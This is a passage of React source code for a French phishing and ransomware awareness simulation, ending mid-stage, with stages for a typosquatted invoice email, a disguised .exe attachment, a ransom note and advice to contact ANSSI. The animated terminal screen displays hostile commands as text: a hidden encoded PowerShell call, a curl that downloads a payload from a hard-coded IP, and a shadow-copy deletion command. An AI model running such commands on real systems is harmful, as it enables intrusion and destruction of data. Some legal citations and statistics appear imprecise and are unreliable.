import React, { useState, useRef, useEffect, useCallback } from 'react';
import { useLocation } from 'wouter';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronLeft, ChevronRight, Shield, BookOpen, CheckCircle, XCircle, Info, RotateCcw, Lock, Zap, Eye, EyeOff } from 'lucide-react';

const T = {
  bg: '#ffffff', surface: '#f7f8fa', line: '#e8eaed',
  blue: '#006a9e', red: '#ef4444', green: '#10b981', amber: '#f59e0b',
  text: '#0f172a', sub: '#64748b', muted: '#94a3b8', dark: '#0d1117',
  MONO: "'JetBrains Mono', monospace",
  SANS: "'Plus Jakarta Sans', sans-serif",
};

// ─── Types ─────────────────────────────────────────────────────────────────────

interface KnowledgeCard { term: string; definition: string; example?: string; law?: string; }

type StageState = 'waiting' | 'correct' | 'wrong' | 'auto';

interface Stage {
  id: string;
  chapter: string;
  title: string;
  story: string[];
  knowledge?: KnowledgeCard[];
  screen: React.FC<{ onAction: (id: string) => void; state: StageState; actionResult?: string }>;
  instruction?: string;
  correctAction?: string;
  wrongActions?: string[];
  correctFeedback: string;
  wrongFeedback?: string;
  autoPlay?: boolean;
}

// ─── Knowledge Panel ───────────────────────────────────────────────────────────

function KnowledgePanel({ cards }: { cards: KnowledgeCard[] }) {
  const [open, setOpen] = useState<number | null>(null);
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
      {cards.map((card, i) => (
        <div key={i} style={{ border: `1px solid ${T.line}`, background: T.surface }}>
          <button
            onClick={() => setOpen(open === i ? null : i)}
            style={{ width: '100%', padding: '9px 14px', background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <BookOpen size={10} color={T.blue} />
              <span style={{ fontFamily: T.MONO, fontSize: 10, fontWeight: 700, color: T.blue }}>{card.term}</span>
            </div>
            <ChevronRight size={10} color={T.muted} style={{ transform: open === i ? 'rotate(90deg)' : 'none', transition: 'transform 0.15s' }} />
          </button>
          <AnimatePresence>
            {open === i && (
              <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.18 }} style={{ overflow: 'hidden' }}>
                <div style={{ padding: '0 14px 12px', borderTop: `1px solid ${T.line}` }}>
                  <p style={{ fontFamily: T.SANS, fontSize: 12, color: T.sub, lineHeight: 1.65, margin: '10px 0 6px' }}>{card.definition}</p>
                  {card.example && (
                    <div style={{ padding: '8px 10px', background: '#fff', border: `1px solid ${T.line}`, borderLeft: `3px solid ${T.blue}`, marginBottom: 6 }}>
                      <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, textTransform: 'uppercase', marginBottom: 3 }}>Exemple réel</div>
                      <p style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, margin: 0, lineHeight: 1.55 }}>{card.example}</p>
                    </div>
                  )}
                  {card.law && (
                    <div style={{ padding: '8px 10px', background: '#fffbf0', border: `1px solid ${T.amber}44`, borderLeft: `3px solid ${T.amber}` }}>
                      <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.amber, textTransform: 'uppercase', marginBottom: 3 }}>⚖ Cadre légal / bonne pratique</div>
                      <p style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, margin: 0, lineHeight: 1.55 }}>{card.law}</p>
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      ))}
    </div>
  );
}

// ─── PHISHING Screens ──────────────────────────────────────────────────────────

const InboxScreen: React.FC<{ onAction: (id: string) => void; state: StageState; actionResult?: string }> = ({ onAction, state }) => {
  const [hoveredEmail, setHoveredEmail] = useState<number | null>(null);
  const emails = [
    { from: 'comptabilite@votre-fournisseur-rh.fr', subj: '⚠ ACTION REQUISE — Facture impayée #INV-2024-8821', time: '08:47', unread: true, suspicious: true, id: 'open_email' },
    { from: 'it@entreprise.fr', subj: 'Maintenance prévue samedi 23h–01h', time: 'Ven', unread: false, suspicious: false, id: 'safe1' },
    { from: 'newsletter@linkedin.com', subj: 'Marie Curie a visité votre profil', time: 'Ven', unread: false, suspicious: false, id: 'safe2' },
  ];
  const done = state === 'correct' || state === 'wrong';
  return (
    <div style={{ background: '#1e2433', height: '100%', display: 'flex', flexDirection: 'column', fontFamily: T.MONO, fontSize: 11 }}>
      <div style={{ background: '#006a9e', padding: '7px 14px', color: '#fff', fontSize: 12, fontFamily: T.SANS, fontWeight: 600 }}>
        📧 Outlook — m.dupont@entreprise.fr
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: '190px 1fr', flex: 1, overflow: 'hidden' }}>
        <div style={{ background: '#161b22', borderRight: '1px solid #30363d', padding: '8px 0' }}>
          {['📥 Boîte de réception (1)', '📤 Envoyés', '📝 Brouillons', '🗑 Corbeille'].map((f, i) => (
            <div key={i} style={{ padding: '7px 14px', color: i === 0 ? '#e6edf3' : '#6e7681', fontSize: 11, background: i === 0 ? 'rgba(0,106,158,0.25)' : 'transparent' }}>{f}</div>
          ))}
          {!done && (
            <div style={{ marginTop: 20, padding: '0 10px' }}>
              <motion.button
                whileHover={{ scale: 1.02 }}
                onClick={() => onAction('report')}
                style={{ width: '100%', padding: '8px 10px', background: 'rgba(16,185,129,0.15)', border: `1px solid ${T.green}44`, color: T.green, fontSize: 10, cursor: 'pointer', fontFamily: T.MONO, textAlign: 'left' }}
              >
                🛡 Signaler au SI
              </motion.button>
            </div>
          )}
        </div>
        <div style={{ overflowY: 'auto' }}>
          {emails.map((email, i) => (
            <motion.div
              key={i}
              whileHover={!done ? { background: 'rgba(255,255,255,0.04)' } : {}}
              onMouseEnter={() => !done && setHoveredEmail(i)}
              onMouseLeave={() => setHoveredEmail(null)}
              onClick={() => !done && onAction(email.id)}
              style={{
                padding: '12px 16px', borderBottom: '1px solid #30363d',
                background: email.suspicious ? 'rgba(239,68,68,0.06)' : 'transparent',
                cursor: done ? 'default' : 'pointer',
                transition: 'background 0.1s',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                <span style={{ color: email.suspicious ? T.red : '#8b949e', fontWeight: email.unread ? 700 : 400, fontSize: 10 }}>{email.from}</span>
                <span style={{ color: '#6e7681', fontSize: 9 }}>{email.time}</span>
              </div>
              <div style={{ color: email.unread ? '#e6edf3' : '#8b949e', fontWeight: email.unread ? 600 : 400, fontFamily: T.SANS, fontSize: 12 }}>{email.subj}</div>
              {email.suspicious && (
                <div style={{ marginTop: 5, display: 'flex', gap: 6, alignItems: 'center' }}>
                  <span style={{ fontFamily: T.MONO, fontSize: 8, color: T.red, background: 'rgba(239,68,68,0.15)', padding: '2px 6px' }}>⚠ EXPÉDITEUR EXTERNE NON VÉRIFIÉ</span>
                  {hoveredEmail === i && !done && (
                    <span style={{ fontFamily: T.MONO, fontSize: 8, color: T.amber }}>← cliquez pour ouvrir</span>
                  )}
                </div>
              )}
            </motion.div>
          ))}
        </div>
      </div>
    </div>
  );
};

const AttachmentScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction, state }) => {
  const done = state === 'correct' || state === 'wrong';
  return (
    <div style={{ background: '#1e2433', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 32, fontFamily: T.MONO }}>
      <div style={{ background: '#161b22', border: `1px solid ${T.red}55`, padding: 28, maxWidth: 380, width: '100%' }}>
        <div style={{ fontFamily: T.SANS, fontWeight: 700, color: '#e6edf3', marginBottom: 18, fontSize: 14 }}>📎 Pièce jointe détectée</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14, background: '#0d1117', padding: 14, marginBottom: 14 }}>
          <span style={{ fontSize: 36 }}>📄</span>
          <div>
            <div style={{ color: '#e6edf3', fontSize: 12 }}>facture_2024_8821.pdf</div>
            <div style={{ color: T.red, fontSize: 9, marginTop: 4 }}>⚠ Extension cachée réelle : <strong>.pdf.exe</strong></div>
            <div style={{ color: '#6e7681', fontSize: 9, marginTop: 2 }}>847 KB — Signataire inconnu</div>
          </div>
        </div>
        <div style={{ background: 'rgba(245,158,11,0.1)', border: `1px solid ${T.amber}44`, padding: 10, marginBottom: 18, fontSize: 9, color: T.amber, lineHeight: 1.6 }}>
          ⚠ Windows masque les extensions par défaut.<br />
          Ce fichier est un <strong>programme exécutable (.exe)</strong> déguisé en PDF.<br />
          Domaine expéditeur : <span style={{ color: T.red }}>fournisseur-rh.fr</span> (attendu : fournisseur-rh<strong>.com</strong>)
        </div>
        {!done && (
          <div style={{ display: 'flex', gap: 10 }}>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('download')}
              style={{ flex: 1, padding: '11px 0', background: T.red, color: '#fff', border: 'none', cursor: 'pointer', fontFamily: T.MONO, fontSize: 11, fontWeight: 600 }}>
              💾 Télécharger et ouvrir
            </motion.button>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('cancel')}
              style={{ flex: 1, padding: '11px 0', background: 'rgba(16,185,129,0.15)', color: T.green, border: `1px solid ${T.green}55`, cursor: 'pointer', fontFamily: T.MONO, fontSize: 11 }}>
              ✕ Annuler & signaler
            </motion.button>
          </div>
        )}
        {done && state === 'wrong' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ color: T.red, fontSize: 10, textAlign: 'center', padding: 10, background: 'rgba(239,68,68,0.1)', border: `1px solid ${T.red}44` }}>
            ⚠ Exécution en cours... Le malware est actif.
          </motion.div>
        )}
      </div>
    </div>
  );
};

const TerminalAutoScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction }) => {
  const lines = [
    { text: 'C:\\Users\\dupont> [Processus silencieux démarré]', color: '#8b949e', delay: 200 },
    { text: '> powershell -WindowStyle Hidden -enc JABzAD0ATgBlAHcA...', color: T.amber, delay: 900 },
    { text: '> [✓] Windows Defender désactivé (registre modifié)', color: T.red, delay: 2000 },
    { text: '> curl -s http://185.220.101.47/stage2.exe -o %TEMP%\\svchost32.exe', color: T.amber, delay: 3000 },
    { text: '> [✓] Connexion C2 établie : 185.220.101.47:443 (TLS/Tor)', color: T.red, delay: 4200 },
    { text: '> [✓] Payload ransomware v3.1 chargé en mémoire', color: T.red, delay: 5300 },
    { text: '> Scan réseau local 192.168.1.0/24...', color: T.amber, delay: 6200 },
    { text: '> [✓] Partages : \\\\SRV-RH\\Docs  \\\\SRV-Compta\\2024', color: T.red, delay: 7200 },
    { text: '> find C:\\Users -name "*.docx" "*.xlsx" "*.pdf" "*.pst" "*.jpg"', color: T.amber, delay: 8200 },
    { text: '> [✓] 4 291 fichiers identifiés. Lancement chiffrement AES-256...', color: T.red, delay: 9300 },
  ];
  const [visible, setVisible] = useState(0);
  const [ready, setReady] = useState(false);
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const timers: ReturnType<typeof setTimeout>[] = [];
    lines.forEach((l, i) => {
      timers.push(setTimeout(() => setVisible(i + 1), l.delay));
    });
    timers.push(setTimeout(() => setReady(true), 10500));
    return () => timers.forEach(clearTimeout);
  }, []);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [visible]);

  return (
    <div style={{ background: T.dark, height: '100%', padding: 20, fontFamily: T.MONO, fontSize: 12, display: 'flex', flexDirection: 'column' }}>
      <div style={{ color: '#6e7681', marginBottom: 12, fontSize: 10 }}>● ● ●  Terminal — activité en arrière-plan (invisible pour la victime)</div>
      <div style={{ flex: 1, overflowY: 'auto' }}>
        {lines.slice(0, visible).map((line, i) => (
          <motion.div key={i} initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }} style={{ color: line.color, marginBottom: 7, lineHeight: 1.5 }}>
            {line.text}
          </motion.div>
        ))}
        {visible > 0 && visible < lines.length && (
          <motion.span animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.7 }} style={{ color: T.green }}>█</motion.span>
        )}
        <div ref={endRef} />
      </div>
      {ready && (
        <motion.button
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          onClick={() => onAction('continue')}
          style={{ marginTop: 16, padding: '10px 0', background: 'rgba(239,68,68,0.15)', border: `1px solid ${T.red}55`, color: T.red, fontFamily: T.MONO, fontSize: 11, cursor: 'pointer', textAlign: 'center' }}
        >
          ▶ Voir la suite de l'attaque →
        </motion.button>
      )}
    </div>
  );
};

const EncryptingScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction }) => {
  const [count, setCount] = useState(0);
  const [done, setDone] = useState(false);
  const exts = ['DOCX', 'XLSX', 'PDF', 'JPG', 'PPTX', 'PST', 'CSV', 'SQL', 'BAK', 'PNG', 'MP4', 'RAW'];

  useEffect(() => {
    const i = setInterval(() => setCount(c => {
      if (c >= 4291) { clearInterval(i); setDone(true); return 4291; }
      return c + Math.floor(Math.random() * 22) + 5;
    }), 100);
    return () => clearInterval(i);
  }, []);

  return (
    <div style={{ background: '#0a0000', height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 24, fontFamily: T.MONO, textAlign: 'center' }}>
      <motion.div animate={{ opacity: [1, 0.3, 1] }} transition={{ repeat: done ? 0 : Infinity, duration: 0.8 }}
        style={{ color: T.red, fontSize: 15, fontWeight: 700, marginBottom: 6 }}>
        {done ? '🔒 CHIFFREMENT TERMINÉ' : '🔐 CHIFFREMENT EN COURS...'}
      </motion.div>
      <div style={{ color: '#6e7681', fontSize: 9, marginBottom: 20 }}>AES-256-CBC | Clé RSA-4096 envoyée au serveur C2</div>
      <div style={{ color: T.red, fontSize: 36, fontWeight: 800, marginBottom: 4 }}>{count.toLocaleString('fr-FR')}</div>
      <div style={{ color: '#6e7681', fontSize: 10, marginBottom: 20 }}>/ 4 291 fichiers chiffrés</div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 4, width: '100%', maxWidth: 340, marginBottom: 20 }}>
        {exts.map((ext, i) => {
          const threshold = (i / exts.length) * 4291;
          const active = count > threshold;
          return (
            <motion.div key={ext} animate={{ background: active ? '#330000' : '#111', borderColor: active ? T.red : '#222' }}
              style={{ padding: '4px 0', textAlign: 'center', fontSize: 8, color: active ? T.red : '#333', border: '1px solid #222', transition: 'all 0.3s' }}>
              .{ext}
            </motion.div>
          );
        })}
      </div>
      {done && (
        <motion.button
          initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
          onClick={() => onAction('continue')}
          style={{ padding: '10px 24px', background: 'rgba(239,68,68,0.15)', border: `1px solid ${T.red}55`, color: T.red, fontFamily: T.MONO, fontSize: 11, cursor: 'pointer' }}>
          ▶ Voir la demande de rançon →
        </motion.button>
      )}
    </div>
  );
};

const RansomScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction, state }) => {
  const [h, setH] = useState(71); const [m, setM] = useState(59); const [s, setS] = useState(47);
  const done = state === 'correct' || state === 'wrong';
  useEffect(() => {
    const i = setInterval(() => setSec(), 1000);
    return () => clearInterval(i);
  }, []);
  const setSec = () => setS(prev => { if (prev > 0) return prev - 1; setM(prev2 => { if (prev2 > 0) return prev2 - 1; setH(prev3 => prev3 > 0 ? prev3 - 1 : 0); return 59; }); return 59; });
  const pad = (n: number) => String(n).padStart(2, '0');
  return (
    <div style={{ background: '#000', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 }}>
      <div style={{ border: `2px solid ${T.red}`, padding: 28, maxWidth: 360, width: '100%', textAlign: 'center', fontFamily: T.MONO }}>
        <div style={{ fontSize: 40, marginBottom: 10 }}>🔒</div>
        <div style={{ color: T.red, fontSize: 14, fontWeight: 700, marginBottom: 10 }}>VOS FICHIERS ONT ÉTÉ CHIFFRÉS</div>
        <div style={{ color: '#c9d1d9', fontSize: 10, lineHeight: 1.8, marginBottom: 16 }}>
          4 291 fichiers sont inaccessibles.<br />
          Envoyez <span style={{ color: T.amber, fontWeight: 700, fontSize: 13 }}>0.8 BTC ≈ 32 400 €</span><br />
          à cette adresse Bitcoin :
        </div>
        <div style={{ background: '#1a0000', padding: 10, marginBottom: 16, wordBreak: 'break-all', color: T.amber, fontSize: 9 }}>
          3Fk9mRxT7vQpNs2wJ8cLdHyBg5AeUiMo1Pr
        </div>
        <div style={{ color: '#6e7681', fontSize: 9, marginBottom: 6 }}>Destruction de la clé dans :</div>
        <div style={{ color: T.red, fontSize: 26, fontWeight: 800, marginBottom: 20 }}>
          {pad(h)}:{pad(m)}:{pad(s)}
        </div>
        {!done && (
          <div style={{ display: 'flex', gap: 10 }}>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('pay')}
              style={{ flex: 1, padding: '11px 0', background: 'rgba(239,68,68,0.15)', border: `1px solid ${T.red}55`, color: T.red, cursor: 'pointer', fontFamily: T.MONO, fontSize: 10, fontWeight: 600 }}>
              💸 Payer la rançon
            </motion.button>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('anssi')}
              style={{ flex: 1, padding: '11px 0', background: 'rgba(16,185,129,0.15)', border: `1px solid ${T.green}55`, color: T.green, cursor: 'pointer', fontFamily: T.MONO, fontSize: 10, fontWeight: 600 }}>
              🛡 Contacter l'ANSSI
            </motion.button>
          </div>
        )}
        {done && (
          <div style={{ color: state === 'correct' ? T.green : T.red, fontSize: 10, padding: 10, background: state === 'correct' ? 'rgba(16,185,129,0.1)' : 'rgba(239,68,68,0.1)', border: `1px solid ${state === 'correct' ? T.green : T.red}44` }}>
            {state === 'correct' ? '✓ ANSSI contactée — analyse en cours' : '⚠ Paiement envoyé — résultat incertain'}
          </div>
        )}
      </div>
    </div>
  );
};

const BilanScreen: React.FC<{ onAction: (id: string) => void; state: StageState; good: boolean }> = ({ good }) => (
  <div style={{ background: good ? '#001a0f' : '#100000', height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 28, fontFamily: T.MONO, textAlign: 'center' }}>
    <div style={{ fontSize: 48, marginBottom: 12 }}>{good ? '🛡' : '💀'}</div>
    <div style={{ color: good ? T.green : T.red, fontSize: 16, fontWeight: 700, marginBottom: 10 }}>
      {good ? 'ATTAQUE BLOQUÉE' : 'SYSTÈME COMPROMIS'}
    </div>
    <div style={{ color: '#6e7681', fontSize: 10, maxWidth: 280, lineHeight: 1.8, marginBottom: 24 }}>
      {good
        ? "Grâce à vos bons réflexes, l'ANSSI a identifié la souche. Déchiffrement gratuit proposé. Vos données sont récupérées. Plainte déposée sous 72h — assurance activée."
        : "Rançon payée. 65% de chance de récupérer les données (Sophos 2023). Vous êtes désormais sur la liste des 'payeurs' — cible prioritaire pour une prochaine attaque."}
    </div>
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, width: '100%', maxWidth: 300 }}>
      {[
        ['Données récupérées', good ? '100%' : '62%'],
        ['Coût total incident', good ? '~8 000 €' : '~89 000 €'],
        ['Durée d\'arrêt', good ? '4 heures' : '11 jours'],
        ['Conformité RGPD', good ? '✓ Notifié' : '✗ Hors délai'],
      ].map(([label, val], i) => (
        <div key={i} style={{ background: good ? 'rgba(16,185,129,0.08)' : 'rgba(239,68,68,0.08)', border: `1px solid ${good ? T.green : T.red}22`, padding: 12 }}>
          <div style={{ color: '#6e7681', fontSize: 8, marginBottom: 4 }}>{label}</div>
          <div style={{ color: good ? T.green : T.red, fontSize: 13, fontWeight: 700 }}>{val}</div>
        </div>
      ))}
    </div>
  </div>
);

// ─── PHISHING Story Data ───────────────────────────────────────────────────────

function buildStages(choices: Record<string, string>): Stage[] {
  const goodChoices = choices['inbox'] === 'report' && choices['attachment'] === 'cancel' && choices['ransom'] === 'anssi';

  return [
    {
      id: 'inbox',
      chapter: 'ACTE 1 / 6',
      title: 'Un email arrive dans votre boîte',
      instruction: '→ Interagissez avec la boîte mail : ouvrez l\'email ou signalez-le au service informatique.',
      story: [
        'Lundi matin, 08h47. Vous ouvrez votre messagerie. Un email affiche une urgence : **"Facture impayée — votre compte sera suspendu dans 24h"**.',
        'L\'expéditeur semble être un fournisseur habituel. Le ton est professionnel, urgent. C\'est exactement ce que les attaquants veulent : **vous faire agir vite, sans réfléchir**.',
        'Cette technique s\'appelle le **phishing** (hameçonnage). En 2023, c\'est le vecteur d\'entrée numéro 1 des cyberattaques en France (83% des incidents — ANSSI).',
      ],
      knowledge: [
        { term: 'Phishing', definition: 'Technique d\'ingénierie sociale par email visant à tromper la victime pour lui faire effectuer une action nuisible (cliquer, télécharger, payer). L\'urgence créée est intentionnelle.', example: 'En 2020, une attaque de phishing ciblée (spear-phishing) a permis de compromettre le compte Twitter de Barack Obama, Elon Musk et Apple.', law: 'Article 323-1 du Code pénal : usurpation d\'identité numérique et fraude informatique. Jusqu\'à 5 ans de prison.' },
        { term: 'Ingénierie sociale', definition: 'Manipulation psychologique exploitant les biais cognitifs humains (autorité, urgence, confiance, peur). L\'humain est statistiquement plus vulnérable que les systèmes informatiques.', example: '"Je n\'ai jamais eu besoin de hacker un ordinateur. Je hackais les gens." — Kevin Mitnick, hacker légendaire des années 90.' },
      ],
      screen: InboxScreen,
      correctAction: 'report',
      wrongActions: ['open_email'],
      correctFeedback: 'Excellent réflexe. Signaler sans interagir est la règle d\'or. Le SI peut analyser les en-têtes de l\'email (IP source, chemin SMTP), bloquer l\'expéditeur au niveau serveur et alerter toute l\'organisation. Vous venez d\'éviter l\'intrusion dès le départ.',
      wrongFeedback: 'Vous avez ouvert l\'email. Un pixel de tracking invisible a confirmé à l\'attaquant que votre adresse est active et que vous avez réagi à son appât. La suite de l\'attaque peut maintenant commencer.',
    },
    {
      id: 'attachment',
      chapter: 'ACTE 2 / 6',
      title: 'La pièce jointe piégée',
      instruction: '→ Téléchargez la facture ou annulez et signalez le fichier suspect.',
      story: [
        'L\'email contient une pièce jointe : **"facture_2024_8821.pdf"**. Mais regardez attentivement l\'extension réelle affichée dans la fenêtre de téléchargement...',
        'Le fichier s\'appelle en réalité **"facture_2024_8821.pdf.exe"**. Windows masque les extensions connues par défaut, ce qui dissimule le danger. C\'est une technique appelée **double extension**.',
        'L\'email provient du domaine **"fournisseur-rh.fr"** alors que le vrai domaine est **"fournisseur-rh.com"** — une seule lettre de différence, invisible à la lecture rapide. C\'est du **typosquatting**.',
      ],
      knowledge: [
        { term: 'Typosquatting', definition: 'Enregistrement de noms de domaine quasi-identiques à des domaines légitimes (une lettre changée, ajout d\'un tiret, extension différente) pour tromper les victimes.', example: 'paypa1.com (le "l" remplacé par "1") au lieu de paypal.com. Impossible à détecter à lecture rapide.', law: 'Bonne pratique : avant tout paiement ou connexion, vérifiez toujours l\'URL complète dans la barre d\'adresse.' },
        { term: 'Double extension & masquage', definition: 'Windows cache par défaut les extensions de fichiers connues. Un attaquant nomme son malware "facture.pdf.exe" — Windows n\'affiche que "facture.pdf" avec l\'icône PDF.', law: 'Solution : activer l\'affichage des extensions dans l\'Explorateur Windows → Affichage → "Extensions de noms de fichiers". Recommandation ANSSI.' },
      ],
      screen: AttachmentScreen,
      correctAction: 'cancel',
      wrongActions: ['download'],
      correctFeedback: 'Vous avez évité le piège. Vérifier par un autre canal (appeler le fournisseur) aurait confirmé qu\'aucune facture n\'a été envoyée ce jour-là. Le fichier est maintenant bloqué et analysé par votre antivirus en sandbox.',
      wrongFeedback: 'Le fichier .exe s\'exécute silencieusement. En moins de 3 secondes, il désactive l\'antivirus et établit une connexion vers un serveur en Russie. L\'attaque est maintenant en cours — regardez ce qui se passe.',
    },
    {
      id: 'execution',
      chapter: 'ACTE 3 / 6',
      title: 'L\'exécution silencieuse',
      instruction: '→ Observez l\'attaque se dérouler en arrière-plan. L\'utilisateur ne voit rien à l\'écran.',
      story: [
        'Le malware s\'exécute. **Rien n\'apparaît à l\'écran** — c\'est intentionnel. En coulisse, il travaille depuis 47 secondes.',
        'Il commence par **désactiver Windows Defender** via une modification du registre, puis contacte un **serveur C2** (Command & Control) hébergé via le réseau Tor. Il télécharge ensuite la charge utile principale : le ransomware.',
        'Technique utilisée : **Living off the Land (LotL)** — exploitation d\'outils Windows légitimes (PowerShell, certutil, wmic) pour éviter la détection. Même un bon antivirus peut rater cette attaque.',
        'C\'est pourquoi la **prévention** (ne pas cliquer) est infiniment plus efficace que la **détection** après coup.',
      ],
      knowledge: [
        { term: 'C2 — Command & Control', definition: 'Serveur distant contrôlé par l\'attaquant. Il reçoit les données volées et envoie des instructions au malware. Souvent hébergé via Tor ou des pays non-coopératifs pour l\'impunité.', example: 'WannaCry (2017) a infecté 200 000 machines dans 150 pays via un C2 Tor. Dommages : 4 à 8 milliards de dollars.' },
        { term: 'Living off the Land (LotL)', definition: 'Technique consistant à n\'utiliser que des outils légitimes du système cible (PowerShell, WMI, certutil) pour éviter les détections antivirus basées sur les signatures.', law: 'NIS2 (2024) impose aux entités essentielles un SIEM (Security Information and Event Management) pour détecter ce type d\'activité anormale.' },
      ],
      screen: TerminalAutoScreen,
      correctAction: 'continue',
      correctFeedback: 'L\'attaque progresse. Le malware a maintenant cartographié votre réseau et identifié tous vos fichiers. La prochaine étape : le chiffrement.',
    },
    {
      id: 'encrypting',
      chapter: 'ACTE 4 / 6',
      title: 'Le chiffrement — vos fichiers disparaissent',
      instruction: '→ Regardez vos fichiers disparaître en temps réel. Aucune action possible à ce stade.',
      story: [
        'Le ransomware utilise **AES-256** pour chiffrer les fichiers et **RSA-4096** pour protéger la clé. Sans la clé privée de l\'attaquant, il est **mathématiquement impossible** de déchiffrer.',
        'En 8 minutes : 4 291 fichiers chiffrés. Documents RH, contrats clients, base comptable, photos. Les **partages réseau** accessibles depuis votre poste sont aussi touchés — toute l\'entreprise est impactée.',
        'Le malware efface également les **shadow copies** (sauvegardes automatiques Windows) pour bloquer toute restauration facile.',
        '**Règle d\'or des sauvegardes : 3-2-1** — 3 copies, sur 2 supports différents, dont 1 hors-ligne déconnectée du réseau. C\'est la seule protection efficace contre un ransomware.',
      ],
      knowledge: [
        { term: 'AES-256 + RSA-4096', definition: 'Chiffrement hybride : AES-256 (symétrique, rapide) chiffre les fichiers. RSA-4096 (asymétrique) chiffre la clé AES. Seul l\'attaquant a la clé privée RSA.', example: 'Casser AES-256 par force brute prendrait plus longtemps que l\'âge de l\'univers avec la technologie actuelle.' },
        { term: 'Shadow Copy (VSS)', definition: 'Fonctionnalité Windows créant des instantanés automatiques du système de fichiers. Les ransomwares modernes les suppriment via "vssadmin delete shadows /all /quiet".', law: 'Règle 3-2-1 : 3 copies · 2 supports différents · 1 hors-ligne. La sauvegarde hors-ligne est la seule protection garantie contre un ransomware.' },
        { term: 'WannaCry (2017)', definition: 'Ransomware ayant causé 4–8 milliards € de dommages. A touché NHS (UK), Renault, Airbus, FedEx. Exploitait EternalBlue, une faille NSA volée par Shadow Brokers.', law: 'Attribution officielle : Corée du Nord, groupe Lazarus (GCHQ + DOJ américain, 2018).' },
      ],
      screen: EncryptingScreen,
      correctAction: 'continue',
      correctFeedback: 'Le chiffrement est terminé. L\'attaquant contrôle maintenant votre réseau. La demande de rançon va apparaître sur tous les écrans de l\'entreprise.',
    },
    {
      id: 'ransom',
      chapter: 'ACTE 5 / 6',
      title: 'La demande de rançon',
      instruction: '→ Vous avez 72h. Que faites-vous ?',
      story: [
        'Un message s\'affiche sur **tous les écrans** de l\'entreprise simultanément. Demande : **0.8 Bitcoin (≈ 32 400€)** dans les 72h. Passé ce délai, le montant double. Après 7 jours, la clé est détruite.',
        '**Obligation légale (LOPMI 2023)** : vous devez déposer plainte dans les **72h** pour être remboursé par votre cyber-assurance. L\'ANSSI recommande de **ne jamais payer** sans consulter les autorités.',
        '**Paradoxe du paiement** : seulement 65% des victimes récupèrent leurs données après paiement (Sophos 2023). Et vous financez potentiellement des organisations sous sanctions internationales — risque pénal pour vous (violations OFAC).',
        'L\'ANSSI propose parfois des outils de **déchiffrement gratuits** pour les souches connues. Le projet européen **No More Ransom** (Europol) en recense des centaines.',
      ],
      knowledge: [
        { term: 'LOPMI 2023', definition: 'Loi d\'Orientation et de Programmation du Ministère de l\'Intérieur : les assureurs ne peuvent rembourser une rançon que si la victime a déposé plainte dans les 72h.', law: 'Article L12-10-1 du Code des assurances. Objectif : décourager les paiements et forcer la coopération avec la justice.' },
        { term: 'ANSSI', definition: 'Agence Nationale de la Sécurité des Systèmes d\'Information. Autorité nationale, sous tutelle du Premier Ministre. Publie des guides, certifie les produits, gère les incidents critiques.', law: 'En cas d\'incident : cybermalveillance.gouv.fr ou cert-fr.eu. Hotline pour TPE/PME : 3018. Déclaration RGPD : cnil.fr sous 72h si données personnelles touchées.' },
        { term: 'RGPD Article 33', definition: 'En cas de violation de données à caractère personnel, le responsable de traitement doit notifier la CNIL dans les 72h. Les ransomwares constituent presque toujours une violation.', law: 'Amende jusqu\'à 4% du chiffre d\'affaires mondial ou 20 M€. En France : cnil.fr → Espace professionnels → Notifications de violations.' },
      ],
      screen: RansomScreen,
      correctAction: 'anssi',
      wrongActions: ['pay'],
      correctFeedback: 'Bonne décision. L\'ANSSI analyse la souche et propose un outil de déchiffrement gratuit (la clé était connue). Plainte déposée sous 72h — l\'assurance peut intervenir. Données récupérées à 100%. Coût total : ~8 000€ (frais d\'intervention). Durée d\'arrêt : 4 heures.',
      wrongFeedback: 'Rançon envoyée. Le paiement en Bitcoin est tracé — le DOJ a déjà récupéré des rançons dans des cas similaires (Colonial Pipeline, 2021). 65% de chance de récupérer les données. Vous êtes maintenant sur la liste des "payeurs" — vous serez refrappé. Coût total : ~89 000€. Arrêt : 11 jours.',
    },
    {
      id: 'bilan',
      chapter: 'ACTE 6 / 6',
      title: 'Bilan & bonnes pratiques',
      instruction: '',
      story: [
